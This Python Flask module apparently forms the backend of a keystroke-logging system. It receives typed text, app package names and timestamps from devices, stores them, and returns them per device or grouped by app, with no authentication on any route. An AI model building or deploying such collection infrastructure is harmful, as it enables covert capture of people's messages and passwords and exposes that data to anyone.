from flask import Blueprint, request, jsonify
from datetime import datetime
from sqlalchemy.exc import SQLAlchemyError
from models.devices import Keystroke
from config.database import db

keystrokes_bp = Blueprint('keystrokes', __name__)


@keystrokes_bp.route('/keystrokes', methods=['POST'])
def save_keystrokes():
    try:
        data = request.get_json()
        device_id = data.get('deviceId')
        keystrokes_data = data.get('keystrokes', [])

        if not device_id or not keystrokes_data:
            return jsonify({'error': 'Missing device ID or keystrokes data'}), 400

        for keystroke in keystrokes_data:
            new_keystroke = Keystroke(
                device_id=device_id,
                package_name=keystroke.get('package_name'),
                text=keystroke.get('text'),
                event_type=keystroke.get('event_type'),
                timestamp=datetime.fromtimestamp(
                    keystroke.get('timestamp') / 1000.0)
            )
            db.session.add(new_keystroke)

        db.session.commit()
        return jsonify({'message': 'Keystrokes saved successfully'}), 200

    except SQLAlchemyError as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500


@keystrokes_bp.route('/local-keystrokes', methods=['POST'])
def save_local_keystrokes():
    try:
        data = request.get_json()
        device_id = data.get('deviceId')
        keystrokes_data = data.get('keystrokes', [])

        if not device_id or not keystrokes_data:
            return jsonify({'error': 'Missing device ID or keystrokes data'}), 400

        # Delete existing keystrokes for this device to avoid duplicates
        Keystroke.query.filter_by(device_id=device_id).delete()

        for keystroke in keystrokes_data:
            new_keystroke = Keystroke(
                device_id=device_id,
                package_name=keystroke.get('package_name'),
                text=keystroke.get('text'),
                event_type=keystroke.get('event_type'),
                timestamp=datetime.fromtimestamp(
                    keystroke.get('timestamp') / 1000.0)
            )
            db.session.add(new_keystroke)

        db.session.commit()
        return jsonify({'message': 'Local keystrokes saved successfully'}), 200

    except SQLAlchemyError as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500


@keystrokes_bp.route('/device/<device_id>/keystrokes', methods=['GET'])
def get_device_keystrokes(device_id):
    try:
        keystrokes = Keystroke.query.filter_by(device_id=device_id)\
            .order_by(Keystroke.timestamp.desc()).all()
        return jsonify([keystroke.to_dict() for keystroke in keystrokes]), 200

    except SQLAlchemyError as e:
        return jsonify({'error': str(e)}), 500


@keystrokes_bp.route('/device/<device_id>/keystrokes/apps', methods=['GET'])
def get_device_keystrokes_by_app(device_id):
    try:
        keystrokes = Keystroke.query.filter_by(device_id=device_id)\
            .order_by(Keystroke.package_name, Keystroke.timestamp.desc()).all()

        apps_data = {}
        for keystroke in keystrokes:
            if keystroke.package_name not in apps_data:
                apps_data[keystroke.package_name] = []
            apps_data[keystroke.package_name].append(keystroke.to_dict())

        return jsonify(apps_data), 200

    except SQLAlchemyError as e:
        return jsonify({'error': str(e)}), 500
